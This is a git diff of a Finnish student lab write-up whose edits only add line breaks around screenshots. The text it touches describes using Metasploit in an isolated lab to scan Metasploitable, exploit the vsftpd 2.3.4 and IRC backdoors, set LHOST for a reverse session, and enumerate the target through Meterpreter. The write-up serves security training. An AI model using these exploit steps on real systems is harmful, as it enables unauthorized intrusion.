@@ -45,7 +45,7 @@ ________________________________________________________________________________
 Aluksi tarkastin verkkoasetukseni: Kalin sekä Metasploitablen verkkoadapterit olivat vaihdettu Host-Only -moodiin ja ne pystyivät pingaamaan toisiaan mutta kummallakaan ei ollut pääsyä internettiin.
 
 
-<img width="627" height="242" alt="PING TEST" src="https://github.com/user-attachments/assets/20a32390-8918-4389-a247-c22eb125cc06" />
+<img width="627" height="242" alt="PING TEST" src="https://github.com/user-attachments/assets/20a32390-8918-4389-a247-c22eb125cc06" /> <br><br>
 
 Seuraavaksi oli aika suorittaa porttiskannaus. Tämä tapahtui komennolla ```db_nmap -sV <METASPLOITABLEN IP-OSOITE>```. 
 - db_nmap suorittaa porttiskannauksen ja tallentaa tulokset tietokantaan (db).
@@ -64,20 +64,20 @@ Komennolla ```hosts``` pystyttiin tarkastelemaan skannauksessa löydettyjä lait
 
     hosts -S <IP-OSOITE>
 
-<img width="823" height="151" alt="HOSTS" src="https://github.com/user-attachments/assets/aa1fa8b9-8522-443b-8025-d2610d0b0108" />
+<br> <img width="823" height="151" alt="HOSTS" src="https://github.com/user-attachments/assets/aa1fa8b9-8522-443b-8025-d2610d0b0108" /> <br>
 
 Komennolla ```services``` saatiin esiin kyseisen hostin käyttämät palvelut ja avoimet portit. -sV parametrin ansiosta myös palveluiden versiot olivat näkyvissä. 
 
-<img width="852" height="407" alt="SERVICES" src="https://github.com/user-attachments/assets/ec0fd0b9-6d7e-4543-87e8-5a22dbe28310" />
+<br> <img width="852" height="407" alt="SERVICES" src="https://github.com/user-attachments/assets/ec0fd0b9-6d7e-4543-87e8-5a22dbe28310" /> <br>
 
 Palveluita pystyi helposti suodattamaan joko palvelun tai portin perusteella. 
 
     sevices -S <palvelu>
     services -p 80
 
-<img width="850" height="168" alt="SSH" src="https://github.com/user-attachments/assets/eac3c183-4651-4337-acee-78684866f967" />
+<br> <img width="850" height="168" alt="SSH" src="https://github.com/user-attachments/assets/eac3c183-4651-4337-acee-78684866f967" /> <br>
 
-<img width="841" height="95" alt="PORT 80" src="https://github.com/user-attachments/assets/7a984247-e1c1-412c-b521-58e29fd96a1a" />
+<br> <img width="841" height="95" alt="PORT 80" src="https://github.com/user-attachments/assets/7a984247-e1c1-412c-b521-58e29fd96a1a" /> <br>
 
 
 ________________________________________________________________________________________________________________________________________________________________________________________
@@ -86,7 +86,7 @@ ________________________________________________________________________________
 
 Valitsin **vsftpd 2.3.4 portissa 21**. Kyseinen exploit voitiin etsiä ```search vsftpd```, jolloin Metasploit palautti kaikki vsftpd -exploitit. Haluttua backdoor exploittia pystyi tutkimaan vielä tarkemin komennolla ```info exploit/unix/ftp/vsftpd_234_backdoor```.
 
-<img width="760" height="431" alt="VSFTPD exploit" src="https://github.com/user-attachments/assets/9f5b1499-9ed5-4587-83dd-d6eafa421b5f" />
+<br> <img width="760" height="431" alt="VSFTPD exploit" src="https://github.com/user-attachments/assets/9f5b1499-9ed5-4587-83dd-d6eafa421b5f" /> <br>
 
 
 ________________________________________________________________________________________________________________________________________________________________________________________
@@ -119,14 +119,14 @@ Metasploitissa oli valmis exploit kyseiseen palveluun, joten hyökkääminen oli
 
 Sain kuitenkin virheilmoituksen: _"Msf: OptionValidateError one or more options failed to validate: LHOST."_.
 
-<img width="855" height="147" alt="LHOST OSOITE" src="https://github.com/user-attachments/assets/53e9d76c-161c-49c7-b254-e85140b323d1" />
+<br> <img width="855" height="147" alt="LHOST OSOITE" src="https://github.com/user-attachments/assets/53e9d76c-161c-49c7-b254-e85140b323d1" /> <br>
 
 Tämä johtui siitä, että Metasploitille ei oltu vielä määritetty _Local Host (LHOST)_  IP-osoitetta, eli tässä tapauksessa Kali-koneen osoitetta. Sain määritettyä sen komennolla ```set LHOST <KALIN IP-OSOITE>```. 
 
 Tämän korjauksen jälkeen exploit komennot uudestaan onnistuneesti. 
 
 
-<img width="844" height="149" alt="BACKDOOR HAS SPAWNNED" src="https://github.com/user-attachments/assets/6080dcc4-d739-41cb-a469-10d924955c89" />
+<br> <img width="844" height="149" alt="BACKDOOR HAS SPAWNNED" src="https://github.com/user-attachments/assets/6080dcc4-d739-41cb-a469-10d924955c89" /> <br>
 
 
 ________________________________________________________________________________________________________________________________________________________________________________________
@@ -139,13 +139,13 @@ Yritin seuraavaksi lähteä hakemaan tietoa kohdekoneesta komennoilla ```whoami`
     getuid
     sysinfo
 
-<img width="466" height="132" alt="image" src="https://github.com/user-attachments/assets/f188c0ec-380c-46de-ac51-b04f493d340f" />
+<br> <img width="466" height="132" alt="image" src="https://github.com/user-attachments/assets/f188c0ec-380c-46de-ac51-b04f493d340f" /> <br>
 
 Ylemmät komennot kertoivat, että kohdekoneen hostname oli metasploitable.localadmin ja sen käyttöjärjestelmä oli Ubuntu 8.04, jossa pyöri Linux 2.6.24-16.server. Lisäksi Meterpreter toimi root-oikeuksin. Root-oikeudet mahdollistavat hyökkääjälle laajat valtuudet etsiä tietoa käyttäjistä, palveluista ja tiedoista. Se myös helpottaa muiden kohteiden tai tietojen löytämistä.
 
 Hain verkkotiedot ```ipconfig``` komennolla. Se kertoi missä aliverkossa kone on. ```arp``` -komennolla saatiin välimuistissa olevat IP-osoitteet. 
 
-<img width="546" height="410" alt="image" src="https://github.com/user-attachments/assets/fe03da71-481b-4e89-8fcb-89e241d4cd19" />
+<br> <img width="546" height="410" alt="image" src="https://github.com/user-attachments/assets/fe03da71-481b-4e89-8fcb-89e241d4cd19" /> <br>
 
 
 Kerätyillä tiedoilla hyökkääjän olisi täten mahdollistaa alkaa muodostamaan kuvaa millaisessa ympäristö toimitaan. Käyttöjärjestelmä, oikeudet, verkko ja mitä laitteita se on havainnut ovat kaikki hyödyllistä tietoa hyökkääjän kannalta, joita voidaan hyödyntää lateral movement -polun suunnitteluun.
@@ -162,7 +162,7 @@ Tutustuin tunnettuihin Metasploitablen haavoittuvuuksiin ja löysin IRC-palvelun
     set <METASPLOITABLEN IP-OSOITE>
     run
 
-<img width="1002" height="679" alt="image" src="https://github.com/user-attachments/assets/a944aed2-3ee1-4f26-8ecb-9b83dfea0b82" />
+<br> <img width="1002" height="679" alt="image" src="https://github.com/user-attachments/assets/a944aed2-3ee1-4f26-8ecb-9b83dfea0b82" /> <br>
 
 
 ________________________________________________________________________________________________________________________________________________________________________________________
@@ -187,12 +187,12 @@ ps
 background & sessions
 - Istunto voidaan siirtää taustalle ja aktiivisia istuntoja voidaan selata ```sessions``` -komennolla ja palata haluttuun sessioon.
 
-<img width="985" height="291" alt="image" src="https://github.com/user-attachments/assets/08e7d883-05a6-4dce-b328-ee37f9f5054e" />
+<br> <img width="985" height="291" alt="image" src="https://github.com/user-attachments/assets/08e7d883-05a6-4dce-b328-ee37f9f5054e" /> <br>
 
 
 ```shell``` -komennolla voidaan avata tavallinen komentotulkki Meterpreterin sisällä. Komentotulkilla voidaan käyttää Linuxin normaaleja komentoja, kuten whoami, hostname ja uname -a. ```exit``` -komennolla voidaan palata takaisin Meterpretreriin.
 
-<img width="681" height="97" alt="image" src="https://github.com/user-attachments/assets/99093a26-255a-488d-ae78-3bf7c5f8f758" />
+<br> <img width="681" height="97" alt="image" src="https://github.com/user-attachments/assets/99093a26-255a-488d-ae78-3bf7c5f8f758" /> <br>
 
 
 ________________________________________________________________________________________________________________________________________________________________________________________
@@ -206,8 +206,8 @@ Avasin Meterpreterissä normaalin komentotulkin ```shell``` -komennolla ja käyn
 
 Käytin tallennuksen aikana jo ylempää tuttuja komentoja, _whoami, hostname, uname -a & ip a_. Tallennuksen sai lopetettua ```exit``` -komennolla. 
 
-<img width="982" height="325" alt="CAT LOG001.TXT" src="https://github.com/user-attachments/assets/be71e941-7623-41ba-9dd2-92c4cd3c698e" />
-
+<br> <img width="982" height="325" alt="CAT LOG001.TXT" src="https://github.com/user-attachments/assets/be71e941-7623-41ba-9dd2-92c4cd3c698e" /> <br>
+ 
 
 Hyötynä tässä on se, että hyökkäyksen aikana tehdyt komennot ja niiden tulosteet voidaan helposti tallentaa myöhempää analyysiä varten.
 
